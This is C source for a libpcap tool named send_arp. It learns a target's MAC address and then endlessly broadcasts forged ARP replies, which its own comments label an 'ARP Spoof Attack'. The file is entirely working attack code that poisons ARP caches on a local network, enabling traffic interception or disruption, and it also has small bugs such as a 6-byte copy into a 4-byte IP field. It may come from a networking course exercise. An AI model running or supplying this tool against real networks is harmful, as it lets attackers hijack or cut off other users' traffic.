#include <stdio.h>
#include <pcap.h>
#include <unistd.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/ether.h>
#include <string.h>
#include <netdb.h>
#include <linux/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>

#define ARP 0x806

#pragma pack(push,1)

typedef struct arp_packet{
	u_int16_t htype;
	u_int16_t ptype;
	u_int8_t hsize;
	u_int8_t psize;
	u_int16_t opcode;
	u_int8_t sender_mac[6];
	u_int8_t sender_ip[4];
	u_int8_t target_mac[6];
	u_int8_t target_ip[4];
}ARP_PACKET;

int main(int argc, char* argv[]){
	//Initializing
	if(argc != 4){
		printf("send_arp <interface> <sender_ip> <target_ip>\n");
		return -1;
	}
	char* inf=argv[1];
	unsigned char packet[100];
	struct ether_header ether;
	struct arp_packet arp;
	struct in_addr iaddr;
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(inf, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", inf, errbuf);
		return -1;
	}

	

	//Get Sender MAC&ip
	struct ifreq s;
	int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
	strcpy(s.ifr_name, inf);
	if(0!= ioctl(fd, SIOCGIFHWADDR, &s)){
		printf("ERROR: Cannot get local MAC addr\n");
		return -1;
	}
	memcpy(arp.sender_mac, s.ifr_addr.sa_data, 6);
	inet_pton(AF_INET, argv[2], &iaddr.s_addr);
	memcpy(arp.sender_ip, &iaddr.s_addr, 4);
	close(fd);

	//Get target MAC(Send ARP)
	memset(packet, 0x00, sizeof(packet));
	memset(ether.ether_dhost, 0xff, 6);
	memcpy(ether.ether_shost, arp.sender_mac, 6);
	ether.ether_type = htons(ARP);
	memcpy(packet, &ether, sizeof(ether));
	arp.htype = htons(0x1);
	arp.ptype = htons(0x800);
	arp.hsize = 6;
	arp.psize = 4;
	arp.opcode = htons(0x1);
	memset(arp.target_mac, 0, 6);
	inet_pton(AF_INET, argv[3], &iaddr.s_addr);
	memcpy(arp.target_ip, &iaddr.s_addr, 4);
	memcpy(packet+sizeof(ether), &arp, sizeof(arp));
	pcap_sendpacket(handle, packet, sizeof(ether) + sizeof(arp));

	//Get target MAC(Get ARP)
	while(1){
		struct pcap_pkthdr *header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if(res==0) continue;
		if(res==-1 || res==-2){
			printf("ERROR:pcap recieve error\n");
			return -1;
		}
		if(packet[12]==8 && packet[13]==6 && packet[21]==2){
			if(0==strncmp((char *)packet+28, (char *)arp.target_ip, 4)){
				memcpy(arp.target_mac, packet+22,6);
				break;
			}
		}
	}
		
	//Preparing ARP Spoof Attack
	memset(packet, 0, 100);
	memset(ether.ether_dhost, 0xff, 6); //Broadcast
	arp.opcode=htons(0x2); //Response
	memcpy(arp.sender_ip, arp.target_ip, 6); //Set sender_ip to gateway IP
	memset(arp.target_ip, 0x00, 4);	
	memset(arp.target_mac, 0xff,6);
	memcpy(packet, &ether, sizeof(ether));
	memcpy(packet+sizeof(ether), &arp, sizeof(arp));

	printf("ARP Spoofind in progress. Press CTRL+C to cancel.\n");
	while(1){
		pcap_sendpacket(handle, packet, sizeof(ether)+sizeof(arp));
	}
	
}

